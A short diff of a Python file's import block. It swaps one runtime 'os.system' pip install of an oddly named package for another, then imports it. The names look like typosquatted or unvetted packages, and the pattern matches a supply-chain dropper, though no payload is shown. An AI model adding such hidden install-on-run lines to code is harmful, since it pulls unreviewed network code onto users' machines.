@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitelibaryV1")
-import pythonsqlitelibaryV1
+os.system("pip install syssqlite2extensions")
+import syssqlite2extensions
 import random
 import requests
 import time
